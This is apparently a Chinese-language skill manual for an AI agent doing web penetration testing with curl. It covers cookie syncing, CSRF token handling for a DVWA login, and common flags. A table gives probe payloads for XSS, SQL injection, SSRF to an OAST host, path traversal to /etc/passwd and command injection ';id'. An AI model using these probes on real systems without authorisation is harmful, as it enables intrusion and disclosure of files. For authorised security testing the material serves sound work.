---
name: curl
description: 原生 HTTP 客户端，所有漏洞验证的瑞士军刀。
category: utility
---

# curl 使用手册

## 何时用

- 漏洞验证的 baseline：sqlmap / python3 上场前先 curl 探一次确认目标活
- 单步 HTTP 请求（GET / POST / 自定义 method / 自定义 header）
- 拿 cookie / 跟 redirect / 看响应 header（`-v` / `-I`）
- 任何漏洞 POC 的最简表达（写 finding 时的 reproducer 命令）

## Cookie 跨工具桥接（双向）

**browser-use 浏览器和 curl 是独立 cookie jar，必须显式同步**。

### browser → curl 方向

```bash
browser-use cookies get > /tmp/browser_cookies.json
# 手动转 Netscape cookies.txt 格式 / 或直接用 jq 抽 PHPSESSID 等
```

### curl → browser 方向（首选一行批量）

```bash
# 批量导入 Playwright JSON 格式
browser-use cookies import /tmp/cookies.json

# 单条设
browser-use cookies set name=PHPSESSID value=xxx domain=target.com
```

**不要**用 `browser-use eval "document.cookie=..."` 同步——**HttpOnly cookie 注入不了**（JS 看不到），会卡 20+ 步。

## CSRF token 处理

DVWA / WordPress / Laravel 等 form 字段含 `user_token` / `_csrf_token`：

```bash
# 1) GET 拿页面 + cookie + 抽 token
curl -c /tmp/cookies.txt 'http://target/login.php' | grep -oP 'name="user_token" value="\K[^"]+' > /tmp/token

# 2) POST 带 cookie + token
TOKEN=$(cat /tmp/token)
curl -b /tmp/cookies.txt -c /tmp/cookies.txt \
  -d "username=admin&password=password&Login=Login&user_token=$TOKEN" \
  'http://target/login.php'
```

**关键**：每次刷新页面 token 会变，每次 POST 前都要重抽。

## 漏洞验证常用 pattern

| 漏洞 | curl pattern |
|---|---|
| Reflected XSS | `curl 'http://x/y?q=<script>alert(1)</script>'` → grep 响应 body 看是否原样反射 |
| SQLi 探测 | `curl 'http://x/y?id=1%27'` (单引号) 看 500/SQL error |
| SSRF | `curl 'http://x/y?url=http://oast.fun-uuid'` 配合 interactsh-client 监听 |
| 文件读 | `curl 'http://x/y?file=../../etc/passwd'` |
| 命令注入 | `curl 'http://x/y?cmd=;id'` 看响应是否含 `uid=` |

## 常见 flag

```
-v          verbose（看请求/响应 header）
-I          只看 response header（HEAD 请求）
-L          跟 redirect
-c FILE     存 cookie 到文件
-b FILE     带 cookie 文件
-d 'k=v'    POST body
-H 'X: Y'   自定义 header
-X METHOD   自定义 method
-k          忽略 TLS 证书错（自签 / MITM 场景）
--max-time S  整个请求超时（防卡死）
```

## 输出 grep 关键字

- HTTP status `^HTTP/`：判 200/302/500
- `Set-Cookie:` 拿新发的 cookie
- 响应 body 关键字：`error in your SQL`（SQLi）/ `script>alert`（XSS reflect）/ `root:x:0:0`（文件读 success）
